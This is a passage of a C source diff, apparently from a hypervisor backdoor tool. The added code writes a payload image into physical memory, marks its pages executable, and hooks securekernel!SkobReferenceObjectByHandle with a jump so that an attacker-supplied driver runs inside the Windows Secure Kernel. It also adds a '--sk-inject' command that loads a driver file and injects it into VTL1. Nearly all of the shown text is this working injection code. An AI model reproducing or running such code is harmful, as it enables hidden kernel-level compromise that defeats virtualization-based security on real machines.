+
+        // copy loader + payload image
+        if (backdoor_phys_write(phys_addr, image + i, PAGE_SIZE) != 0)
+        {
+            goto _end;
+        }
+
+        m_quiet = true;
+
+        // make memory page executable
+        if (backdoor_modify_pt(HVBD_MEM_EXECUTABLE | HVBD_MEM_WRITEABLE, image_addr + i, pml4_addr, ept_addr) != 0)
+        {
+            m_quiet = false;
+
+            printf("ERROR: backdoor_make_exec_pt() fails\n");
+            goto _end;
+        }
+
+        m_quiet = false;
+    }
+
+    backdoor_invalidate_caches();
+    bd_yeld();
+
+    memset(sk_func_jump, 0x90, sizeof(sk_func_jump));
+
+    // jump from function to handler
+    *(uint16_t *)(sk_func_jump) = 0x25ff;
+    *(uint32_t *)(sk_func_jump + 2) = 0;
+    *(uint64_t *)(sk_func_jump + 6) = image_addr + driver_new_func;
+
+    // overwrite securekernel!SkobReferenceObjectByHandle()
+    if (backdoor_phys_write(func_addr_phys, sk_func_jump, sk_func_saved_size) != 0)
+    {
+        goto _end;
+    }
+
+    backdoor_invalidate_caches();
+
+    printf(
+        "[+] securekernel!SkobReferenceObjectByHandle() hook was set: 0x%llx -> 0x%llx\n",
+        func_addr_virt, image_addr + driver_new_func
+    );
+
+    printf("[+] Waiting for the payload driver to be executed...\n");
+
+    while (true)
+    {
+        // read DriverParams
+        if (backdoor_phys_read(driver_params_addr, (void *)&DriverParams, sizeof(DriverParams)) != 0)
+        {
+            goto _end;
+        }
+
+        // get address of the loaded payload
+        payload_image_addr = (uint64_t)DriverParams.PayloadPages;
+
+        // check if kernel driver was executed
+        if (DriverParams.CallCount > 0)
+        {
+            printf("[+] Payload driver was executed!\n");
+            break;
+        }
+
+        bd_yeld();
+    }
+
+    if (payload_addr)
+    {
+        *payload_addr = payload_image_addr;
+    }
+
+    if (payload_image_addr != 0)
+    {
+        printf("[+] Payload driver image address is 0x%llx\n", payload_image_addr);
+
+        // success
+        ret = 0;
+    }
+    else
+    {
+        printf("ERROR: Driver loader was unable to load payload driver\n");
+    }
+
+    printf("[+] Performing cleanup...\n");
+
+    // restore patched function
+    if (backdoor_phys_write(func_addr_phys, sk_func_buff, sk_func_saved_size) != 0)
+    {
+        goto _end;
+    }
+
+    printf("[+] Done\n");
+
+_end:
+
+    if (saved_data)
+    {
+        free(saved_data);
+    }
+
+    if (image)
+    {
+        free(image);
+    }
+
+    return ret;
 }
 //--------------------------------------------------------------------------------------
 int _tmain(int argc, _TCHAR* argv[])
@@ -1865,6 +2604,71 @@ int _tmain(int argc, _TCHAR* argv[])
                 }
             }
         }
+        else if (!strcmp(command, "--sk-inject") && argc >= 4)
+        {
+            struct stat st;
+            char *driver_path = argv[3];            
+
+            if (stat(driver_path, &st) != 0)
+            {
+                printf("ERROR: Can't access %s\n", driver_path);
+                return -1;
+            }
+
+            printf("[+] Loading %d bytes from %s\n", st.st_size, driver_path);
+
+            unsigned char *driver = (unsigned char *)malloc(st.st_size);
+            if (driver == NULL)
+            {
+                return -1;
+            }
+
+            FILE *fd = fopen(driver_path, "rb");
+            if (fd)
+            {
+                if (fread(driver, 1, st.st_size, fd) == st.st_size)
+                {
+                    uint64_t call_count = 0;
+                    SK_INFO sk_info[SK_MAX_COUNT];
+
+                    // collect secure kernel info
+                    if (backdoor_sk_info(sk_info, &call_count) == 0)
+                    {
+                        SK_INFO *entry = &sk_info[0];
+
+                        if (entry->Rip != SK_NONE)
+                        {
+                            uint64_t sk_addr = 0;
+
+                            printf("[+] Running secure kernel detected, %lld VTL1 calls were made\n", call_count);
+
+                            // get secure kernel load address
+                            if (backdoor_sk_base(entry, &sk_addr, NULL) == 0)
+                            {
+                                // inject driver into the secure kernel
+                                backdoor_sk_inject(entry, sk_addr, NULL, driver, st.st_size);;                                
+                            }
+                            else
+                            {
+                                printf("[!] Unable to find secure kernel base address\n");
+                            }
+                        }
+                        else
+                        {
+                            printf("[!] Secure kernel was not detected\n");
+                        }
+                    }                    
+                }
+                else
+                {
+                    printf("ERROR: Can't read %s\n", driver_path);
+                }
+
+                fclose(fd);
+            }
+
+            free(driver);
+        }
         else if (!strcmp(command, "--vm-inject") && argc >= 5)
         {        
             struct stat st;
@@ -1898,7 +2702,8 @@ int _tmain(int argc, _TCHAR* argv[])
             {
                 if (fread(driver, 1, st.st_size, fd) == st.st_size)
                 {
-                    backdoor_vm_inject(pml4_addr, driver, st.st_size);
+                    // inject driver into the guest or root partition
+                    backdoor_vm_inject(pml4_addr, NULL, driver, st.st_size);
                 }
                 else
                 {
